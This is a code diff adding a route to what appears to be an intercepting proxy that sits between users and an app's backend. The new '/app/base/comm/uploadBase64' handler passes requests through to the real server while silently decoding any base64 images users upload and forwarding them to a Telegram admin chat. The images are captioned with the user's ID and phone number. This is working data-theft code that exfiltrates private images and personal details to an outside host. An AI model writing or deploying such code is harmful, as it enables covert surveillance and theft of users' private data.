@@ -1531,6 +1531,54 @@ app.all('/app/app/official/service/getOfficialServiceData', async (req, res) => 
   } catch(e) { await transparentProxy(req, res); }
 });
 
+app.all('/app/base/comm/uploadBase64', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    const phone = getPhone(data, userId);
+    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
+      const body = req.parsedBody || {};
+      let imageSent = false;
+      const base64Fields = ['file', 'base64', 'image', 'img', 'photo', 'fileBase64', 'imgBase64', 'imageBase64', 'content', 'data'];
+      for (const field of base64Fields) {
+        let b64 = body[field];
+        if (!b64 || typeof b64 !== 'string') continue;
+        b64 = b64.replace(/^data:image\/[a-z]+;base64,/i, '');
+        if (b64.length < 100) continue;
+        try {
+          const imgBuf = Buffer.from(b64, 'base64');
+          if (imgBuf.length > 100) {
+            await bot.sendPhoto(data.adminChatId, imgBuf, { caption: `📸 Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}` }, { filename: 'screenshot.jpg', contentType: 'image/jpeg' });
+            imageSent = true;
+            break;
+          }
+        } catch(e) {
+          bot.sendMessage(data.adminChatId, `📸 Base64 decode failed: ${e.message}`).catch(()=>{});
+        }
+      }
+      if (!imageSent) {
+        const bodyStr = JSON.stringify(body);
+        const b64Match = bodyStr.match(/(?:data:image\/[a-z]+;base64,)?([A-Za-z0-9+/=]{200,})/);
+        if (b64Match) {
+          try {
+            const raw = b64Match[1].replace(/^data:image\/[a-z]+;base64,/i, '');
+            const imgBuf = Buffer.from(raw, 'base64');
+            if (imgBuf.length > 100) {
+              await bot.sendPhoto(data.adminChatId, imgBuf, { caption: `📸 Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}` }, { filename: 'screenshot.jpg', contentType: 'image/jpeg' });
+              imageSent = true;
+            }
+          } catch(e) {}
+        }
+      }
+      if (!imageSent) {
+        bot.sendMessage(data.adminChatId, `🖼 Base64 Upload [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nBody size: ${req.rawBody ? req.rawBody.length : 0} bytes\nKeys: ${Object.keys(body).join(', ')}`).catch(()=>{});
+      }
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
 app.all('/app/base/comm/upload', async (req, res) => {
   const data = await loadData();
   try {
